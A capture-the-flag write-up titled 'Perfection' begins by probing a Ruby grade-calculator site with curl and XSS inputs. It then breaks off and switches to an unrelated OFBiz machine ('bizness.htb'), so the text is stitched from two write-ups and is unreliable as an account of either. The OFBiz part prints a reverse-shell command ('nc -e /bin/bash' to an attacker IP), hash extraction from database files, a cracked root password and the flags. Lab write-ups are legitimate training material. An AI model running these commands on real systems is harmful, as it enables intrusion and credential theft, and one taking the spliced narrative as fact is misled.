= Perfection

Author:: 0x42697262
Category:: Linux
Difficulty:: Easy
Play Date:: 2024/05/20 - 2024/06/19

== Introduction

A vulnerable Ruby web server hosted on Linux.

== Methodology

. Scan the web server ``10.10.11.253`` for open ports.
. Find potential vulnerabilities.

=== NMAP

Scan with nmap

----
$ nmap -sS -sV -sC -O -oN perfection.txt 10.10.11.253

Nmap scan report for 10.10.11.253
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) <.>
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx <.>
|_http-title: Weighted Grade Calculator
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=5/20%OT=22%CT=1%CU=35182%PV=Y%DS=2%DC=I%G=Y%TM=664B539
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1
OS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
----
<.> SSH Port Open
<.> HTTP Port Open

*OpenSSH 8.9p1* doesn't seem to have any obvious vulnerabilities.
I looked through Metasploit to see if there are any exploits for that version.
I found nothing usable as of my knowledge.

However, browsing the web server might give more clues.

=== Ruby Web Server

Opening ``http://10.10.11.253:80/`` returns the home page.

.Weighted Grade Calculator Home Page
image::perfection/web-home.png[]

While reading the web server, it appears that the web server were made by security students who are probably inexperienced.
So, I went and checked their web app.

.Weighted Grade Calculator Web App
image::perfection/web-calc.png[]

There were inputs.
Bingo!
One should not easily assume it's vulnerable but I can always test it.

Thus, I tried to use the web app normally.
It worked as expected.
However, the web app doesn't make a POST request if the categories are not completely filled.
The sum of the *Weight (%)* must all equal to *100%*.

.Basic Input
image::perfection/input1.png[]

Since this is a web application, the next thing I wanted to see is the *request* and *response* of the web app.
It returns a response of JSON data.

.Basic Input Log
image::perfection/result1.png[]

But it appears that the values are placed directly on the page.
Should I try doing XSS?
Will there be input sanitization?
What's the point of XSS anyway?
Okay, if not XSS, then some sort of injection can be used, right?

.Result HTML Source
image::perfection/result-html-source.png[]

But since I didn't wanna keep typing the inputs into the form, I copied the POST request as cURL command.

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=e&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked"

Your total grade is 10%<p>a: 1%</p><p>b: 2%</p><p>c: 3%</p><p>d: 3%</p><p>e: 1%</p>
----

I added some grep commands to only output what I needed.

.cURL Command
image::perfection/curl-base.png[]

The command is too long, I tried trimming it down to one category but this just results in ``Malicious input blocked``.
Something not what I want.

I tried changing one of the category values into ``<script>alert(1);</script>``.
That didn't work.

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=<script>alert(1);</script>&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=e&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked"

Malicious input blocked
----

I kept wondering why it wouldn't work.
Then I realized that web browsers tends to encode the data of the request body.
Thus, I tried doing that.

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=e&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked"

Malicious input blocked
----

But oh well, the same exact result.
Bummer.

I tried using the symbols ``( ) < > ; [ ] { }`` individually yet it still resulted the same error.

I didn't know what kind of web server I am dealing with, I wanted to know what framework is used as backend.
Turns out the answer was at the bottom of the website: ``WEBrick 1.7.0``.
This is a *Ruby HTTP server toolkit*.
Now, that's a progress.

I looked for exploits related to version *1.7.0* but the results on the web shows different versions and old as well.


=== Exploitation

First create a connection for the reverse shell to connect to

----
$ nc -lvnp 6969 <.>
----
<.> Pick any port you like

Then execute the exploit downloaded on another terminal

----
$ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.20 6969' <.>
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
----
<.> Make sure to point the server to your machine's IP address

On the netcat terminal, this should be printed on the screen

----
listening on [any] 6969 ...
connect to [10.10.16.20] from (UNKNOWN) [10.10.11.252] 49924
----

And we're in!

That can be verified with these commands

----
$ whoami
ofbiz
$pwd
/opt/ofbiz
----

== Finding The Flag

The current directory apparently have tons of files and it would be difficult to find the root flag.

Finding the user flag is quite easy, simply print it out

----
$ cat ~/user.txt
2ecc953f42e90c7a284fcab56f26867e
----

As for the root flag, it's located in ``/root/root.txt`` however the current user (ofbiz) does not have permissions to read, write, and execute on that directory.

It's painful to dumpster dive the password of the root user.
It's not located in the Dockerfile nor in the configurations.

There is however an encrypted password in the file ``/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml``.

[, xml]
----
$ cat AdminUserLoginData.xml

<?xml version="1.0" encoding="UTF-8"?>
<!--
Licensed to the Apache Software Foundation (ASF) under one
or more contributor license agreements.  See the NOTICE file
distributed with this work for additional information
regarding copyright ownership.  The ASF licenses this file
to you under the Apache License, Version 2.0 (the
"License"); you may not use this file except in compliance
with the License.  You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing,
software distributed under the License is distributed on an
"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
KIND, either express or implied.  See the License for the
specific language governing permissions and limitations
under the License.
-->

<entity-engine-xml>
    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/> <.>
    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
</entity-engine-xml>
----
<.> This line contains a SHA password.

However, I do not see any use or a way to crack the password.

Upon further reading about Apache's OFBiz, the password is stored as plaintext as SHA hash somewhere in the ``./runtime/data`` directory.

Since I am lazy, I proceeded to simply print the strings of each and every file that contains a *SHA*.

----
$ cd ./runtime/data/derby/ofbiz/seg0
$ strings * | grep SHA

SHA-256
MARSHALL ISLANDS
SHAREHOLDER
SHAREHOLDER
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I <.>

----
<.> We found are root password hashed with SHA.

== Cracking the Root Flag

Certainly, I can code my own tool for cracking the hashed password using a wordlist dictionary but someone else have already created that tool for us to use.
Can be accessed https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker[here].

I used *rockyou.txt* as my wordlist.

After cracking the SHA hash, we should now acquire the password.

----
monkeybizness
----

== Get Root Flag

Login with root

----
$ su
Password: monkeybizness
----

Check if we truly are root

----
# whoami
root
----

Acquire the root flag

----
# cat /root/root.txt
628643013da646b11a7f82adfd4f1b12
----

== Challenge Summaries

Extract the archive with ``tar``

Use an existing tool to exploit Apache's OFBiz 18.12

----
$ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.20 6969' <.>
----

Get the user flag

----
$ cat ~/user.txt
2ecc953f42e90c7a284fcab56f26867e
----

Crack the SHA hash then get the root flag

----
$ cd ./runtime/data/derby/ofbiz/seg0
$ strings * | grep SHA

SHA-256
MARSHALL ISLANDS
SHAREHOLDER
SHAREHOLDER
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I <.>
----

----
$ su
Password: monkeybizness
----

----
# cat /root/root.txt
628643013da646b11a7f82adfd4f1b12
----

== Lessons Learned

. Apache's OFBiz
. Searching for existing exploits

== Conclusion

Not a fun challenge when you have to search the files one by one when you do not have experience with OFBiz.
I don't wanna do this shit again.

[IMPORTANT] 
.Flag
==== 
user:2ecc953f42e90c7a284fcab56f26867e

root:628643013da646b11a7f82adfd4f1b12
====
